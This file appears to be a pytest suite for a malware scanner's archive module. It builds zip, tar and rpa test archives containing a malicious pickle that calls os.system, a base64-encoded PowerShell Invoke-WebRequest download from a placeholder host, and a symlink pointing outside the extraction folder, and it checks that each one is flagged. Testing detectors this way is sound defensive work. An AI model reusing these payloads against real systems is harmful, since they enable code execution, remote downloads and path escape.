from pathlib import Path
import base64
import tarfile
import zipfile

from Virus_Scan.scanners import archives
from Virus_Scan.scanners.ci.archive_boundary_audit import run_archive_boundary_audit


def _low(tags):
    return {str(tag).lower() for tag in tags or []}


def _assert_archive_finding_publication(tags):
    low = _low(tags)
    assert "archive_member_finding_evidence_recorded" in low
    assert "archive_final_json_must_record" in low
    assert "archive_member_finding_member" in low


def test_zip_pickle_payload_finding_requires_archive_final_json_publication(tmp_path: Path):
    sample = tmp_path / "pickle_payload.zip"
    malicious_pickle = b'cos\nsystem\n(S"calc"\ntR.'
    with zipfile.ZipFile(sample, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("payload.pkl", malicious_pickle)

    tags, suspicious = archives.scan_archive_file(str(sample))
    low = _low(tags)

    assert suspicious
    assert "zip_archive" in low
    assert "archive_member_pickle_payload" in low
    assert "pickle_dangerous_global" in low
    assert "pickle_reduce_opcode" in low
    assert "archive_member_pickle_payload_finding" in low
    assert "archive_member_finding:archive_member_pickle_payload_finding" in low
    _assert_archive_finding_publication(tags)


def test_tar_payload_chain_finding_requires_archive_final_json_publication(tmp_path: Path):
    member = tmp_path / "encoded.txt"
    member.write_text(base64.b64encode(b"powershell Invoke-WebRequest http://example.invalid/a").decode("ascii"))
    sample = tmp_path / "payload_chain.tar"
    with tarfile.open(sample, "w") as archive:
        archive.add(member, arcname="encoded.txt")

    tags, suspicious = archives.scan_archive_file(str(sample))
    low = _low(tags)

    assert suspicious
    assert "tar_archive" in low
    assert "archive_member_decoded_payload_observed" in low
    assert "payload_decode_confirmed" in low
    assert "archive_member_decoded_payload_finding" in low
    assert "archive_member_finding:archive_member_decoded_payload_finding" in low
    _assert_archive_finding_publication(tags)


def test_rpa_zip_payload_and_pickle_findings_publish_archive_json_markers(tmp_path: Path):
    sample = tmp_path / "rpa_payload_findings.rpa"
    malicious_pickle = b'cos\nsystem\n(S"calc"\ntR.'
    encoded = base64.b64encode(b"powershell Invoke-WebRequest http://example.invalid/a").decode("ascii")
    with zipfile.ZipFile(sample, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("payload.pkl", malicious_pickle)
        archive.writestr("encoded.txt", encoded)

    tags, suspicious = archives.scan_rpa_file(str(sample))
    low = _low(tags)

    assert suspicious
    assert "rpa_archive" in low
    assert "rpa_zip_container" in low
    assert "archive_member_pickle_payload_finding" in low
    assert "archive_member_decoded_payload_finding" in low
    assert "archive_member_finding_evidence_recorded" in low
    assert "archive_final_json_must_record" in low


def test_tar_unsupported_member_type_requires_archive_policy_evidence(tmp_path: Path):
    sample = tmp_path / "unsupported_member.tar"
    with tarfile.open(sample, "w") as archive:
        info = tarfile.TarInfo("link_to_escape")
        info.type = tarfile.SYMTYPE
        info.linkname = "../escape.txt"
        archive.addfile(info)

    tags, suspicious = archives.scan_archive_file(str(sample))
    low = _low(tags)

    assert suspicious
    assert "tar_archive" in low
    assert "archive_unsupported_member_type" in low
    assert "archive_member_failure_evidence_recorded" in low
    assert "scanner_failure_evidence:archive:archive_unsupported_member_type" in low
    assert "archive_final_json_must_record" in low


def test_phase9_archive_boundary_audit_still_clean_after_finding_publication_hooks():
    result = run_archive_boundary_audit(Path("."))
    assert result.ok, result.to_record()
    assert result.files_scanned >= 13
